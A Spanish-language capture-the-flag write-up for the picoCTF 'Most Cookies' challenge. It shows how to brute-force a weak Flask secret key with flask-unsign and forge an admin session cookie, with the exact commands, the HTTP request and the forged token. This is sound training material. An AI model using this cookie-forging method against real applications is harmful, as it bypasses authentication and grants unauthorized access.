
# Descripcion
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/cae5577e6b8f86e17d7884723204f61e/server.py) [http://mercury.picoctf.net:6259/](http://mercury.picoctf.net:6259/)

## Hints
How secure is a flask cookie?

## Solucion

Lo primero que tenemos que hacer es analizar la pagina web que nos proporciona, el reto, en este caso, es muy parecida a una pagina que ya hemos trabajado. Lo primero que hacemos es escribir en la barra de busqueda 'snickerdoodle'. Una vez que lo escribimos nos damos cuenta que genera una cookie de session:

```
GET /display HTTP/1.1
Host: mercury.picoctf.net:6259
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mercury.picoctf.net:6259/
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-n5mg.cmc1I_Y6_nVJD_wkjJKZzWdLA1g
Connection: keep-alive

```

Y ya no tenemos mas informacion. Seguimos en etapa de reconocimiento, por lo que ahora analizamos el codigo en python que proporciona el reto. 
Analizamos el codigo, y me doy cuenta que es el codigo fuente. Con este codigo fuente me doy cuenta como bypassear por medio de la cookie. Lo interesante es este fragmento de codigo:

```
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp



```

En este caso, si decodificamos la cookie (base64) obtenemos `{"very_auth":"snickerdoodle"}` y la firma. Pero como podemos saber con que clave esta firmada la cookie?

El codigo fuente tambien, me da la solucion:

```
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

```

Ahora se que alguna de esos nombres de galletas se uso como clave para firmar la cookie.

Hago uso de la herramienta `flask-unsign` para hacer un ataque de fuerza bruta y encontrar la clave con la que se firmo esta cookie.

1. Guardo todas las cookies en un txt
```
flask-unsign --unsign --wordlist cookies.txt --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-n92w.f3kHwYT4rPf7cw-Jv-EKY_ERAns'
```

Este me devuelve la clave con la que se firmo
Salida:
```
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'gingersnap'
```

En mi caso `gingersnap` es la clave que se uso para firmar la cookie, ahora por medio de esta clave creo una cookie con el nombre  `admin` y la firmo con la clave.

Hago uso de `flask-unsign`

```
flask-unsign --sign --cookie '{"very_auth": "admin"}' --secret "gingersnap"
```

Obtengo la siguiente salida:

```
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-n-HA.Urf59kpxiK2tttrjUFj21wPodd4
```

Ahora, solo modifico la cookie, pegando la salida anterior. Y recargo la pagina:

![[images/flagCookies.png]]

## Referencias
